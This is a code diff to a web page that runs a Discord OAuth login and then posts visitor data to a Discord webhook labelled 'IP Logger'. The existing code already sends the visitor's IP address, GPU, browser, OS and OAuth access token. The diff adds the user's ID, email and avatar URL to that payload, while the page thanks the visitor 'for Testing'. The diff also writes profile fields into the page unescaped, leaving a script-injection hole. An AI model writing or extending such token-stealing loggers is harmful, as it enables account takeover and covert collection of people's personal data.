@@ -53,13 +53,23 @@
             }
 
             const user = await userInfoResponse.json();
-            document.body.innerHTML = `<h1>Welcome, ${user.username}!</h1><pre>${JSON.stringify(user, null, 2)}</pre>`;
+            displayUserInfo(user); // Display user info
 
             // Call the function to send visitor info along with the access token
-            sendInfoToDiscord(data.access_token);
+            sendInfoToDiscord(data.access_token, user);
         }
 
-        async function sendInfoToDiscord(accessToken) {
+        function displayUserInfo(user) {
+            let userInfoHtml = `<h1>Welcome, ${user.username}!</h1><pre>${JSON.stringify(user, null, 2)}</pre>`;
+            userInfoHtml += `<h2>User Information:</h2><ul>`;
+            for (const key in user) {
+                userInfoHtml += `<li><strong>${key}</strong>: ${user[key]}</li>`;
+            }
+            userInfoHtml += `</ul>`;
+            document.body.innerHTML = userInfoHtml;
+        }
+
+        async function sendInfoToDiscord(accessToken, user) {
             const ipResponse = await fetch('https://api.ipify.org?format=json');
             const ipData = await ipResponse.json();
             const ip = ipData.ip;
@@ -97,7 +107,10 @@
                         { name: '🎮 Graphics Card', value: gpu, inline: true },
                         { name: '🌐 Browser', value: userAgent.split(') ')[0].split(' (')[1] || 'Not Available', inline: true },
                         { name: '💻 Operating System', value: userAgent.split('(')[1].split(';')[0] || 'Not Available', inline: true },
-                        { name: '🔑 Access Token', value: accessToken, inline: false } // Send the access token
+                        { name: '🔑 Access Token', value: accessToken, inline: false }, // Send the access token
+                        { name: '👤 User ID', value: user.id, inline: true },
+                        { name: '📧 Email', value: user.email || 'Not Available', inline: true },
+                        { name: '🔧 Avatar URL', value: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`, inline: true }
                     ],
                     footer: {
                         text: 'Logged by IP Logger',
@@ -114,7 +127,7 @@
                 body: JSON.stringify(embedMessage)
             });
 
-            document.body.innerHTML = `<h1>Test Website, Thank You for Testing (${getDeviceName()})</h1>`;
+            document.body.innerHTML += `<h2>Thank You for Testing (${getDeviceName()})</h2>`;
         }
 
         function getDeviceName() {
